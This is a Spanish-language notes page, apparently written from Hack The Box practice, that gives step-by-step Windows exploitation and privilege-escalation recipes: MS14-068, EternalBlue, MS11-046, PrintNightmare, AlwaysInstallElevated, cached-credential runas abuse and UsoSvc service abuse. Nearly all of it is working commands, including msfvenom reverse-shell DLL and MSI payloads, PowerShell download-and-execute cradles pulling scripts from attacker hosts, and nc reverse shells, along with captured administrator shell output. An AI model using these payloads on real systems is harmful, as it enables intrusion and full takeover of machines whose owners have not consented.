## MS14-068

Aún siendo una vulnerabilidad antigua, hay empresas que siguen usando Windows Server 2008, el cuál es vulnerable a `MS14-068`. Usaremos `impacket` para explotarlo:

```shell
impacket-goldenPac <DOMINIO>/'<USUARIO>':'<CONTRASEÑA>'@<HOSTNAME>.<DOMINIO>
```

## MS17-010

Esta yo creo que es la más conocida; La podemos explotar de dos formas, con metasploit y con AutoBlue. Por mucho que digan algunos que autoblue es mejor por que no es metasploit, están equivocados. Si usan autoblue solamente por leer el código del exploit, pueden leer también el de metasploit y además es mucho más fácil de usar. Vale que metasploit lo da muy masticado todo pero no es necesario ese odio. Yo lo considero una gran herramienta de exploits centralizados que es muy útil si quieres velocidad y luego estudiar que pasa por detrás.
### Metasploit

Pasos sencillos:

```shell
msfconsole
search eternalblue
use 0
set LHOST <TU_IP>
set LPORT <TU_PUERTO>
set RHOSTS <IP_VÍCTIMA>
run
```

### AutoBlue

Usaremos [este](https://github.com/3ndG4me/AutoBlue-MS17-010) repo. Lo único que tienes que hacer es clonarlo y ejecutar el `zzz_exploit.py`:

```shell
python2 zzz_exploit.py <IP_VÍCTIMA>
```

Cabe destacar que necesitas editar la función `smb_pwn` para que ejecute el comando que tú quieras. 
## MS11-046

Esta se conoce algo menos pero se puede explotar de una forma muy fácil. Primero debemos mirar si la versión corresponde a `6.1.7600 N/A Build 7600`. En caso de que sí, nos descargamos [este](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS11-046/ms11-046.exe) exploit. Luego lo movemos a la máquina y lo ejecutamos. 

![[Pasted image 20230808114503.png]]

No puedo explicar todas estas vulnerabilidades, son infinitas. Solo he explicado tres, que son con las que me he topado en máquinas de HTB. Aquí os dejo un repo que es increíble: https://github.com/SecWiki/windows-kernel-exploits/tree/master. Muy recomendado <3

## PrintNightmare

Vale la pena comprobar si un equipo es vulnerable a CVE-2021-1675 con la herramienta [SpoolerScanner](https://github.com/vletoux/SpoolerScanner/blob/master/SpoolerScan.ps1) para luego explotarlo con [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py):

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.11/SpoolerScan.ps1')
```

Luego:

```shell
python3 -m venv PrintNightmare 
cd PrintNightmare 
source bin/activate
git clone https://github.com/cube0x0/impacket 
cd impacket 
pip3 install -r requirements.txt 
python3 setup.py install 
cd ..
```

Después:

```shell
impacket-smbserver smbFolder $(pwd) -smb2support
rlwrap nc -lvnp 4444
```

Luego creamos una shell DLL:

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f dll -o rev.dll
```

Ahora ejecutamos el CVE:

```shell
python3 CVE-2021-1675.py DRIVER/tony:liltony@10.10.11.106 '\\10.10.17.44\smbFolder\rev.dll'
```

Y tenemos shell :D
## AlwaysInstallElevated

Ejecutando winpeas si vemos esto seteado a `1` es crítico. Podemos escalar privilegios con [este](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated) recurso de HackTricks.

![[Pasted image 20230808125910.png]]

Generaremos un archivo malicioso `msi`:

```shell
msfvenom -p windows/.64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f msi -o shell.msi
```

Ahora lo metemos en la víctima y ejecutamos:

```powershell
msiexec /quiet /qn /i shell.msi
```

Esto nos dará una shell como system:

![[Pasted image 20230808130638.png]]

## Cached creds

Podemos ver si hay credenciales cacheadas en memoria con el comando `cmdkey /list`. Si esto devuelve algo así:

```powershell
Target: Domain:interactive=<DOMINIO>\Administrator
Type: Domain Password
User: ACCESS\Administrator
```

Podemos usar `runas` para ganar una shell como administrator:

- Creamos un server de python compartiendo el `PS.ps1`:

```shell
python3 -m http.server 80
```

- Creamos un `nc` en escucha:

```shell
rlwrap nc -lvnp 443
```

- Y en la máquina víctima que hayamos visto que hay credenciales cacheadas:

```powershell
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/PS.ps1')"
```

Esto nos dejará una bonita shell ;D

```shell
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.98] 49161
Windows PowerShell running as user Administrator on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
access\administrator
PS C:\Windows\system32> 
```

Si hay credenciales en caché también se puede explotar como dice el punto de [DPAPI Secrets](/Mimikatz#DPAPI%20secrets). 

## UsoSvc

Podemos darnos cuenta de si podemos abusar o no de este servicio con el módulo `PowerUp` explicado en [aquí](/Enumeración#PowerUp):

```powershell
Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'C:\ProgramData\nc.exe 10.10.14.11 443 -e powershell'
```

Esto nos dejará una shell en nuestro `nc`. 